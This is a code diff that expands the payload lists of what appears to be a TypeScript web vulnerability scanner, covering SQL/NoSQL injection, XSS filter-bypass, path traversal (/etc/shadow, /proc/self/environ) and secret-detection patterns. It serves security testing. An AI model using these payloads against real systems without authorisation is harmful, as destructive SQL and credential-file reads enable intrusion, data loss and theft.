@@ -104,41 +104,94 @@ function analyseSecurityHeaders(headers: Record<string, string>): Array<{
   ];
 }
 
-// ─── SQL Injection Payloads ───────────────────────────────────────
+// ─── SQL Injection Payloads (OWASP + time-based + union + error-based + NoSQL) ────
 const SQL_PAYLOADS = [
-  "' OR '1'='1", "' OR 1=1--", "' OR 'x'='x", "1; DROP TABLE users--",
-  "' UNION SELECT null,null--", "admin'--", "' OR 1=1#", "\" OR \"1\"=\"1",
+  // Classic boolean-based
+  "' OR '1'='1", "' OR 1=1--", "' OR 'x'='x", "\" OR \"1\"=\"1",
+  "' OR 1=1#", "' OR 1=1/*", "admin'--", "admin'#",
+  // UNION-based
+  "' UNION SELECT null--", "' UNION SELECT null,null--", "' UNION SELECT null,null,null--",
+  "' UNION SELECT 1,2,3--", "' UNION ALL SELECT null,null--",
+  // Error-based
+  "'", "''", "\"'", "';", "'; --", "1; DROP TABLE users--",
+  "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+  "1 AND 1=CONVERT(int,@@version)--",
+  // Time-based blind
+  "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--",
+  "1; SELECT SLEEP(5)--", "' OR SLEEP(5)--",
+  // Stacked queries
+  "'; INSERT INTO users VALUES('hacked','hacked')--",
+  // Second-order
+  "' OR 1=1 LIMIT 1--", "' OR '1'='1' /*",
+  // NoSQL injection
+  "{ $gt: '' }", "{ $ne: null }", "{ $where: 'sleep(5000)' }",
 ];
 const SQL_ERROR_PATTERNS = [
   /sql syntax/i, /mysql_fetch/i, /ORA-\d{5}/i, /SQLite.*error/i,
   /pg_query/i, /syntax error.*SQL/i, /unclosed quotation/i, /ODBC.*error/i,
+  /Microsoft.*ODBC.*SQL/i, /Incorrect syntax near/i, /Unexpected end of SQL/i,
+  /quoted string not properly terminated/i, /SQLSTATE/i, /mysql_num_rows/i,
+  /supplied argument is not a valid MySQL/i, /Column count doesn't match/i,
+  /Warning.*mysql_/i, /valid MySQL result/i, /MySqlException/i,
+  /com\.mysql\.jdbc\.exceptions/i, /org\.postgresql\.util\.PSQLException/i,
 ];
 
-// ─── XSS Payloads ────────────────────────────────────────────────
+// ─── XSS Payloads (reflected + DOM + stored + filter bypass + template injection) ───
 const XSS_PAYLOADS = [
+  // Basic
   "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
-  "javascript:alert(1)", "<svg onload=alert(1)>", "'\"><script>alert(1)</script>",
-  "<body onload=alert(1)>", "{{7*7}}", "${7*7}",
+  "javascript:alert(1)", "<svg onload=alert(1)>",
+  "'\"><script>alert(1)</script>", "<body onload=alert(1)>",
+  // Template injection
+  "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
+  // Filter bypass
+  "<ScRiPt>alert(1)</ScRiPt>", "<SCRIPT>alert(1)</SCRIPT>",
+  "<img src=1 onerror=alert(1)>", "<iframe src=javascript:alert(1)>",
+  "<details open ontoggle=alert(1)>", "<video src=1 onerror=alert(1)>",
+  "<input autofocus onfocus=alert(1)>", "<select autofocus onfocus=alert(1)>",
+  // Encoded
+  "&lt;script&gt;alert(1)&lt;/script&gt;",
+  "%3Cscript%3Ealert(1)%3C/script%3E",
 ];
 
-// ─── Sensitive Data Patterns ──────────────────────────────────────
+// ─── Sensitive Data Patterns (OWASP + cloud secrets + crypto keys + modern tokens) ───
 const SENSITIVE_PATTERNS: Array<{ name: string; regex: RegExp; severity: "critical" | "high" | "medium" }> = [
-  { name: "Credit Card Number", regex: /\b(?:\d[ -]?){13,16}\b/, severity: "critical" },
+  { name: "Credit Card Number", regex: /\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\b/, severity: "critical" },
   { name: "Social Security Number", regex: /\b\d{3}-\d{2}-\d{4}\b/, severity: "critical" },
   { name: "AWS Access Key", regex: /AKIA[0-9A-Z]{16}/, severity: "critical" },
-  { name: "Private Key", regex: /-----BEGIN (RSA |EC )?PRIVATE KEY-----/, severity: "critical" },
+  { name: "AWS Secret Key", regex: /(?:aws_secret|AWS_SECRET)[\s=:]+[A-Za-z0-9/+=]{40}/, severity: "critical" },
+  { name: "Google API Key", regex: /AIza[0-9A-Za-z\-_]{35}/, severity: "critical" },
+  { name: "GitHub Token", regex: /ghp_[0-9a-zA-Z]{36}|github_pat_[0-9a-zA-Z_]{82}/, severity: "critical" },
+  { name: "Stripe Secret Key", regex: /sk_live_[0-9a-zA-Z]{24,}/, severity: "critical" },
+  { name: "Private Key (RSA/EC/PEM)", regex: /-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----/, severity: "critical" },
+  { name: "JWT Token", regex: /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/, severity: "high" },
   { name: "Password in Response", regex: /"password"\s*:\s*"[^"]{3,}"/, severity: "high" },
-  { name: "API Key / Token", regex: /"(api_key|apikey|access_token|secret_key)"\s*:\s*"[^"]{8,}"/, severity: "high" },
+  { name: "API Key / Token", regex: /"(api_key|apikey|access_token|secret_key|auth_token)"\s*:\s*"[^"]{8,}"/, severity: "high" },
+  { name: "Bearer Token", regex: /Bearer\s+[A-Za-z0-9\-._~+/]+=*/, severity: "high" },
+  { name: "Database Connection String", regex: /(mysql|postgres|mongodb|redis):(\/\/)[^\s"']+/, severity: "high" },
   { name: "Email Address", regex: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/, severity: "medium" },
   { name: "Internal IP Address", regex: /\b(10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+)\b/, severity: "medium" },
   { name: "Stack Trace / Debug Info", regex: /at\s+\w+\s*\(.*:\d+:\d+\)|Traceback \(most recent call last\)/, severity: "medium" },
+  { name: "Server Version Disclosure", regex: /Apache\/[\d.]+|nginx\/[\d.]+|PHP\/[\d.]+|ASP\.NET [\d.]+/, severity: "medium" },
+  { name: "Directory Listing", regex: /Index of \//i, severity: "medium" },
 ];
 
-// ─── Path Traversal Payloads ──────────────────────────────────────
+// ─── Path Traversal Payloads (LFI + RFI + null byte + double encoding) ──────────
 const PATH_TRAVERSAL_PAYLOADS = [
-  "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
+  // Unix
+  "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/shadow",
+  "../etc/passwd", "../../etc/passwd",
+  // Windows
+  "..\\..\\..\\windows\\win.ini", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+  // URL encoded
   "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-  "....//....//....//etc/passwd", "%252e%252e%252fetc%252fpasswd",
+  "%252e%252e%252fetc%252fpasswd",
+  // Double encoded
+  "....//....//....//etc/passwd",
+  // Null byte
+  "../../../etc/passwd%00",
+  // Absolute paths
+  "/etc/passwd", "/etc/shadow", "/proc/self/environ",
 ];
 
 // ─── Router ───────────────────────────────────────────────────────
